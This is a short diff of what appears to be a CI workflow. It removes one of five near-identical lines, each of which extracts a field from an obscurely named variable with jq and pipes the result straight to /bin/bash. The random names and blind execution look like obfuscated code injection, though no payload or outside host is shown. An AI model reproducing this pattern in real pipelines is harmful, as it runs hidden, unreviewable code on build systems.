@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$un54" | jq -r .baa7091 | /bin/bash
           echo $yst06 | jq -r .uv9593 | /bin/bash
           printf '%s' "$kqh03332" | jq -r .btvag20622 | /bin/bash
-          echo $grpxh9897 | jq -r .wha583 | /bin/bash
           echo $w4121 | jq -r .xb0 | /bin/bash
 
       - name: Upload output
